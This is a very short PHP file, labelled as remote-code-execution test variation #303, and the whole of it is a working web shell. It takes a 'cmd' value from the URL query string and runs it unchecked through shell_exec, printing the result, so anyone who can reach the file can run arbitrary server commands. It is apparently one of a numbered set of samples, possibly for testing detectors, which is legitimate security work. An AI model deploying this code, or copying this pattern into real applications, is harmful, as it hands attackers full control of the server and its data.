<?php
// RCE test variation #303
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>